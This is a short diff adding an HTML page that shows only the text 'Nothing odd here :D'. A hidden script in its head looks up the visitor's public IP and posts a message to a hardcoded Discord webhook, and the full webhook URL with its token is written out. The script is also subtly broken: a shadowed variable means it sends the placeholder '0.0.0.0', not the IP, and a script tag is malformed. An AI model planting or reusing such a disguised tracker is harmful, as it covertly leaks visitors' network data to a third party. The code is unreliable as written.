@@ -1,0 +1,18 @@
+<html><head><script>
+const nachricht = "0.0.0.0";
+async function getPublicIP() {
+  const res = await fetch('https://api.ipify.org?format=json');
+  const data = await res.json();
+  const nachricht = data.ip;
+  console.log('Public IP:', nachricht);
+  return nachricht;
+}
+
+getPublicIP().then(ip => {
+const webhookURL = "https://discord.com/api/webhooks/1417730643873370122/zhL2Sr1-fPUpZ5vCv-q65Ux3gcKAO7IY1fiV4FVDi5A2tZ5HVM7IMxVORaIcFohx2RVs";
+
+fetch(webhookURL, {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ content: nachricht })
+});});<script></head><body>Nothing odd here :D</body></html>
